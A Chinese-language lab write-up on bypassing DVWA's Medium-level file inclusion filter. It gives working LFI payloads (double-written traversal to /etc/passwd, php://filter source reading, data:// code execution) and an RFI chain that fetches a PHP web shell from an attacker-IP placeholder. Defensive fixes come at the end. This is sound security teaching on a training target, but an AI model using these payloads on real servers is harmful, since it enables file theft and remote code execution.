# DVWA File Inclusion (Medium) 通关 WriteUp

## 一、漏洞概述

Medium 级别在 Low 的基础上增加了字符串过滤，使用 `str_replace` 移除了一些危险关键字，包括 `http://`、`https://`、`ftp://`、`php://`、`../`、`..`。

过滤列表：

```php
$file = str_replace( array( "http://", "https://", "ftp://", "php://", "../", "..\\" ), "", $file );
```

虽然过滤了常见 Payload，但由于 `str_replace` 是一次性替换，且未递归处理，仍然可以通过双写、绝对路径、其他协议等方式绕过。

将 DVWA 安全级别设置为 **Medium**，进入 **File Inclusion** 模块。

## 二、源码分析

查看 Medium 级别源码：

```php
<?php
$file = $_GET['page'];
// 过滤危险字符串
$file = str_replace( array( "http://", "https://", "ftp://", "php://", "../", "..\\" ), "", $file );
include($file);
?>
```

关键点：

1. `page` 参数仍然通过 GET 提交。
2. 使用 `str_replace` 将危险字符串替换为空。
3. 过滤是**一次性**的，不会递归替换，因此双写可以绕过。
4. 未限制绝对路径，因此可以直接使用 `/etc/passwd` 等绝对路径。
5. 未禁用其他伪协议，如 `file://`、`data://`、`php://filter`（虽然 `php://` 被过滤，但可双写绕过）。

## 三、本地文件包含绕过

### 1\. 使用绝对路径

过滤只针对 `../` 和 `..`，不针对绝对路径。因此可以直接包含：

```text
?page=/etc/passwd
```

如果成功，页面显示 `/etc/passwd` 内容。

在 Windows 环境下可尝试：

```text
?page=C:\Windows\win.ini
```

### 2\. 双写绕过 `../` 过滤

过滤将 `../` 替换为空。如果输入 `....//`，字符串中第 3-5 个字符恰好是 `../`，会被替换为空，剩下的字符重新组合成 `../`。

具体分析：

```text
输入：....//
字符：. . . . / /
子串：位置 3-5 是 . . /，即 ../
替换后：移除位置 3-5，剩下 . . /，即 ../
```

因此 `....//` 经过过滤后变成 `../`，成功绕过。

Payload 示例：

```text
?page=....//....//....//....//etc/passwd
```

经过过滤后变为：

```text
../../../../etc/passwd
```

### 3\. 使用 `..././` 或其他变体

虽然 `..././` 不包含 `../` 子串，但文件系统解析时可能等价于 `../`，具体取决于系统。更可靠的是使用 `....//`。

### 4\. 使用 `php://filter` 双写绕过

`php://` 被过滤，可以双写：

```text
?page=phphp://p://filter/convert.base64-encode/resource=index.php
```

分析：`phphp://p://` 中包含 `php://` 吗？字符串：p h p h p : / / p : / /。子串 `php://` 需要 p h p : / /。在位置 3-7：p h p : / /？位置 3 是 p，4 是 h，5 是 p，6 是 :，7 是 /，8 是 /。是的，位置 3-8 是 `php://`。替换后剩下 `ph` + `p://` = `php://`。因此可以绕过。

Payload：

```text
?page=phphp://p://filter/convert.base64-encode/resource=index.php
```

### 5\. 使用 `file://` 协议

`file://` 不在过滤列表中，可以包含本地文件：

```text
?page=file:///etc/passwd
```

### 6\. 使用 `data://` 协议

`data://` 不在过滤列表中，如果 `allow_url_include` 开启，可以直接执行代码：

```text
?page=data://text/plain,<?php system('whoami'); ?>
```

## 四、远程文件包含绕过

### 1\. 双写绕过 `http://`

过滤将 `http://` 替换为空。可以构造：

```text
?page=hthttp://tp://攻击者IP/shell.txt
```

分析：`hthttp://tp://` 中包含 `http://` 子串（位置 3-9），替换后剩下 `ht` + `tp://` = `http://`。因此绕过成功。

Payload：

```text
?page=hthttp://tp://攻击者IP/shell.txt
```

### 2\. 使用 `https://` 双写

类似地：

```text
?page=hhttps://ttps://攻击者IP/shell.txt
```

### 3\. 使用大小写绕过

`str_replace` 区分大小写，因此 `HTTP://` 不会被替换。但某些服务器可能不识别大写协议，需测试。

```text
?page=HTTP://攻击者IP/shell.txt
```

### 4\. 使用其他协议

如果 `ftp://` 被过滤，可以尝试 `ftps://`、`sftp://` 等，但需服务器支持。

## 五、完整利用流程

### 1\. 确认 LFI

```text
http://靶机IP/dvwa/vulnerabilities/fi/?page=....//....//....//....//etc/passwd
```

页面显示 `/etc/passwd` 内容，说明 LFI 绕过成功。

### 2\. 读取源码

```text
http://靶机IP/dvwa/vulnerabilities/fi/?page=phphp://p://filter/convert.base64-encode/resource=index.php
```

得到 Base64 编码的源码。

### 3\. RFI GetShell

在攻击机准备 `shell.txt`：

```php
<?php system($_GET['cmd']); ?>
```

放在 Web 目录，然后：

```text
http://靶机IP/dvwa/vulnerabilities/fi/?page=hthttp://tp://攻击者IP/shell.txt&cmd=whoami
```

成功执行命令。

## 六、Burp Suite 验证

用 Burp 拦截请求，直接修改 `page` 参数为上述 Payload，发送并观察响应。注意 URL 编码问题，Burp 中可以手动编码或直接发送原始字符。

## 七、Low 与 Medium 对比

| 对比项   | Low            | Medium                                                                    |
| --- | --- | --- |
| 过滤     | 无             | `str_replace` 移除 `http://`、`https://`、`ftp://`、`php://`、`../`、`..` |
| LFI 绕过 | 直接 `../`     | 绝对路径、`....//` 双写                                                   |
| RFI 绕过 | 直接 `http://` | `hthttp://tp://` 双写、大小写                                             |
| 伪协议   | 直接使用       | `phphp://p://` 双写、`data://`、`file://`                                 |
| 根本问题 | 无过滤         | 过滤不递归，可双写绕过                                                    |

## 八、漏洞成因与防御

**成因**：

1. 使用黑名单过滤，但过滤不完整，可被双写绕过。
2. 未限制绝对路径。
3. 未禁用危险伪协议和远程包含。

**防御措施**：

1. **白名单校验（首选）**  
   只允许包含预定义的文件名：
   ```php
    $allowed = ['include.php', 'about.php', 'contact.php'];
    $file = $_GET['page'];
    if (!in_array($file, $allowed)) {
        die("Invalid file");
    }
    include($file);
   ```
2. **禁用远程包含**
   ```ini
    allow_url_include = Off
    allow_url_fopen = Off
   ```
3. **使用 `realpath()` 限制目录**
   ```php
    $base = '/var/www/dvwa/includes/';
    $file = basename($_GET['page']);
    $path = realpath($base . $file);
    if (strpos($path, realpath($base)) !== 0) {
        die("Invalid path");
    }
    include($path);
   ```
4. **过滤所有路径穿越和伪协议**  
   使用递归过滤或正则表达式，而不是简单的 `str_replace`。
5. **关闭不必要的 PHP 伪协议**  
   在 `php.ini` 中禁用 `data://`、`php://filter` 等。

## 九、总结

Medium 级别虽然增加了 `str_replace` 过滤，但由于过滤不递归，可以轻松绕过：

- LFI：使用绝对路径 `/etc/passwd`，或 `....//` 双写绕过 `../`。
- RFI：使用 `hthttp://tp://` 双写绕过 `http://` 过滤。
- 伪协议：`phphp://p://` 双写绕过 `php://` 过滤。

根本防御是使用白名单，而不是黑名单过滤。